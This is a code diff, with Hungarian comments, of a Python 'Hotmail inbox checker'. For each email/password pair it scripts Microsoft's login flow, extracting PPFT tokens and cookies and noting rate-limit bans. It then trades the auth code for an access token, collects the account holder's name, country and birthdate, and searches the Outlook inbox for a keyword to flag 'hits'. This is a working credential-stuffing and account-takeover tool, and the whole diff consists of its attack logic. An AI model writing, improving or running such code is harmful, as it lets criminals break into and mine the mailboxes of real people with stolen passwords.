@@ -17,18 +17,12 @@ UA_DALVIK = "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041
 
 
 def checker_worker_single(email: str, password: str, keyword: str):
-    """
-    Hotmail inbox checker – Config-ból 1:1 átírva.
-    Returns: hit / custom / bad / retry / error
-    """
     session = requests.Session()
-
-    # EGY UUID AZ EGÉSZ SESSIONRE (Config!)
     session_uuid = str(uuid.uuid4())
 
     try:
         # ========================================================
-        # STEP 0: HRD PRE-CHECK (HIÁNYZOTT!)
+        # STEP 0: HRD PRE-CHECK
         # ========================================================
         hrd_url = (
             "https://odc.officeapps.live.com/odc/emailhrd/getidp"
@@ -53,16 +47,13 @@ def checker_worker_single(email: str, password: str, keyword: str):
         hrd_resp = session.get(hrd_url, headers=hrd_headers, timeout=30)
         hrd_text = hrd_resp.text
 
-        # Config keycheck: Neither/Both/Placeholder/OrgId → Failure
         if any(kw in hrd_text for kw in ["Neither", "Both", "Placeholder", "OrgId"]):
             return {"status": "bad", "reason": "Not MSAccount"}
-
-        # Config keycheck: MSAccount → Success
         if "MSAccount" not in hrd_text:
             return {"status": "bad", "reason": "Not MSAccount"}
 
         # ========================================================
-        # STEP 1: GET /authorize (PPFT + urlPost)
+        # STEP 1: GET /authorize
         # ========================================================
         authorize_url = (
             "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
@@ -102,19 +93,14 @@ def checker_worker_single(email: str, password: str, keyword: str):
             "Accept-Language": "en-US,en;q=0.9",
         }
 
-        resp = session.get(
-            authorize_url, headers=get_headers,
-            allow_redirects=True, timeout=30
-        )
+        resp = session.get(authorize_url, headers=get_headers, allow_redirects=True, timeout=30)
         source = resp.text
 
-        # urlPost kinyerése
         urlPost = ""
         m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', source)
         if m:
             urlPost = m.group(1)
 
-        # PPFT kinyerése
         PPFT = ""
         m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', source)
         if m:
@@ -123,7 +109,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if not PPFT or not urlPost:
             return {"status": "bad", "reason": "No PPFT/urlPost"}
 
-        # Referer (config: ADDRESS-ből "haschrome=1"-ig)
         full_address = str(resp.url)
         parts = full_address.split("haschrome=1")
         referer = f"{parts[0]}haschrome=1" if len(parts) > 1 else full_address
@@ -133,8 +118,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
         # ========================================================
         cookies_dict = session.cookies.get_dict()
 
-        # FIX: PPSX=PassportR (nem Passport!)
-        # FIX: i19=9960 (nem 3772!)
         form_data = (
             f"i13=1&login={email}&loginfmt={email}"
             f"&type=11&LoginOptions=1&lrt=&lrtPartition="
@@ -149,7 +132,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
             f"&i19=9960"
         )
 
-        # FIX: +RefreshTokenSso + MicrosoftApplicationsTelemetryDeviceId
         cookie_str = (
             f"MSPRequ={cookies_dict.get('MSPRequ', '')}; "
             f"uaid={cookies_dict.get('uaid', '')}; "
@@ -195,15 +177,11 @@ def checker_worker_single(email: str, password: str, keyword: str):
         all_cookies_str = str(post_cookies)
         location = post_resp.headers.get("Location", "")
 
-        # ========================================================
-        # BAN DETEKCIÓ (HIÁNYZOTT!)
-        # ========================================================
+        # BAN DETEKCIÓ
         if "too many times with" in post_source:
             return {"status": "retry", "reason": "Rate limited"}
 
-        # ========================================================
-        # SUCCESS CHECK (Config: JSH/JSHP/ANON/WLSSC cookies)
-        # ========================================================
+        # SUCCESS CHECK
         is_success = (
             "JSH" in all_cookies_str
             or "JSHP" in all_cookies_str
@@ -216,33 +194,24 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if not is_success:
             if "account or password is incorrect" in post_source:
                 return {"status": "bad", "reason": "Wrong password"}
-
             error_count = post_source.count("error")
             if error_count > 0:
                 return {"status": "bad", "reason": "Login error"}
-
-            if ("identity/confirm" in post_source
-                    or "Consent/Update" in post_source):
+            if "identity/confirm" in post_source or "Consent/Update" in post_source:
                 return {"status": "bad", "reason": "Identity confirm"}
-
             if "account.live.com/recover" in post_source:
                 return {"status": "bad", "reason": "Recovery needed"}
-
-            if ("account.live.com/Abuse" in post_source
-                    or "finisherror.srf" in location):
+            if "account.live.com/Abuse" in post_source or "finisherror.srf" in location:
                 return {"status": "bad", "reason": "Account blocked"}
-
             return {"status": "bad", "reason": "Auth failed"}
 
-        # Második error check
         error_count = post_source.count("error")
         if error_count > 0:
-            if not any(k in all_cookies_str for k in
-                       ["JSH", "JSHP", "ANON", "WLSSC"]):
+            if not any(k in all_cookies_str for k in ["JSH", "JSHP", "ANON", "WLSSC"]):
                 return {"status": "bad", "reason": "Error in response"}
 
         # ========================================================
-        # STEP 3: Auth code kinyerése
+        # STEP 3: Auth code
         # ========================================================
         auth_code = ""
         if post_resp.status_code in [301, 302, 303, 307, 308]:
@@ -260,7 +229,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             return {"status": "bad", "reason": "No auth code"}
 
         # ========================================================
-        # STEP 4: Token exchange (session.post!)
+        # STEP 4: Token exchange
         # ========================================================
         token_form = (
             "client_info=1"
@@ -281,8 +250,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             timeout=30
         )
 
-        if (token_resp.status_code != 200
-                or "access_token" not in token_resp.text):
+        if token_resp.status_code != 200 or "access_token" not in token_resp.text:
             return {"status": "bad", "reason": "Token failed"}
 
         access_token = token_resp.json().get("access_token", "")
@@ -290,7 +258,7 @@ def checker_worker_single(email: str, password: str, keyword: str):
             return {"status": "bad", "reason": "No access_token"}
 
         # ========================================================
-        # STEP 5: Profil lekérés
+        # STEP 5: Profil
         # ========================================================
         Name = ""
         Country = ""
@@ -323,21 +291,16 @@ def checker_worker_single(email: str, password: str, keyword: str):
                     bm = acc.get("birthMonth", "")
                     by_ = acc.get("birthYear", "")
                     if bd and bm and by_:
-                        Birthdate = (
-                            f"{by_}-{str(bm).zfill(2)}-{str(bd).zfill(2)}"
-                        )
+                        Birthdate = f"{by_}-{str(bm).zfill(2)}-{str(bd).zfill(2)}"
                 if "names" in pdata and pdata["names"]:
                     Name = pdata["names"][0].get("displayName", "")
-            except (json.JSONDecodeError, KeyError, IndexError):
+            except:
                 pass
 
         # ========================================================
-        # STEP 6: StartupData (HIÁNYZOTT!)
+        # STEP 6: StartupData
         # ========================================================
-        startup_url = (
-            f"https://outlook.live.com/owa/{email}"
-            f"/startupdata.ashx?app=Mini&n=0"
-        )
+        startup_url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
         startup_headers = {
             "Host": "outlook.live.com",
             "content-length": "0",
@@ -361,19 +324,13 @@ def checker_worker_single(email: str, password: str, keyword: str):
         }
 
         try:
-            session.post(
-                startup_url, data="",
-                headers=startup_headers, timeout=30
-            )
-        except Exception:
+            session.post(startup_url, data="", headers=startup_headers, timeout=30)
+        except:
             pass
 
         # ========================================================
-        # STEP 7: Inbox keresés (JAVÍTOTT URL + payload!)
+        # STEP 7: Inbox keresés
         # ========================================================
-        # FIX: /searchservice/ (nem /search/!)
-        # FIX: Nincs AnswerEntityRequests
-        # FIX: n=88, Pacific Standard Time
         search_url = (
             "https://outlook.live.com/searchservice/api/v2/query"
             "?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124"
@@ -389,12 +346,8 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 "ContentSources": ["Exchange"],
                 "Filter": {
                     "Or": [
-                        {"Term": {
-                            "DistinguishedFolderName": "msgfolderroot"
-                        }},
-                        {"Term": {
-                            "DistinguishedFolderName": "DeletedItems"
-                        }}
+                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                     ]
                 },
                 "From": 0,
@@ -402,10 +355,8 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 "RefiningQueries": None,
                 "Size": 25,
                 "Sort": [
-                    {"Field": "Score",
-                     "SortDirection": "Desc", "Count": 3},
-                    {"Field": "Time",
-                     "SortDirection": "Desc"}
+                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
+                    {"Field": "Time", "SortDirection": "Desc"}
                 ],
                 "EnableTopResults": True,
                 "TopResultsCount": 3
@@ -414,11 +365,9 @@ def checker_worker_single(email: str, password: str, keyword: str):
                 "EnableSuggestion": True,
                 "EnableAlteration": True,
                 "SupportedRecourseDisplayTypes": [
-                    "Suggestion",
-                    "NoResultModification",
+                    "Suggestion", "NoResultModification",
                     "NoResultFolderRefinerModification",
-                    "NoRequeryModification",
-                    "Modification"
+                    "NoRequeryModification", "Modification"
                 ]
             },
             "LogicalId": "50288413-6c68-e7d3-ab47-2be5431628f2"
@@ -449,35 +398,24 @@ def checker_worker_single(email: str, password: str, keyword: str):
         if search_resp.status_code == 200:
             search_text = search_resp.text
 
-            # HitHighlightedSummary check (config!)
             if "HitHighlightedSummary" in search_text:
                 has_keyword_match = True
 
-            # Total kinyerése
             total_match = re.search(r'"Total"\s*:\s*(\d+)', search_text)
             if total_match:
                 Total = total_match.group(1)
 
-            # FIX: LastDeliveryOrRenewTime (nem LastModifiedTime!)
-            date_match = re.search(
-                r'"LastDeliveryOrRenewTime"\s*:\s*"([^"]+)"',
-                search_text
-            )
+            date_match = re.search(r'"LastDeliveryOrRenewTime"\s*:\s*"([^"]+)"', search_text)
             if date_match:
                 raw_date = date_match.group(1)
                 Date = raw_date.replace("T", " ")[:16]
             else:
-                date_match2 = re.search(
-                    r'"LastModifiedTime"\s*:\s*"([^"]+)"',
-                    search_text
-                )
+                date_match2 = re.search(r'"LastModifiedTime"\s*:\s*"([^"]+)"', search_text)
                 if date_match2:
                     raw_date = date_match2.group(1)
                     Date = raw_date.replace("T", " ")[:16]
 
-        # ========================================================
-        # EREDMÉNY KIÉRTÉKELÉS
-        # ========================================================
+        # EREDMÉNY
         if Total != "0" and has_keyword_match:
             return {
                 "status": "hit",
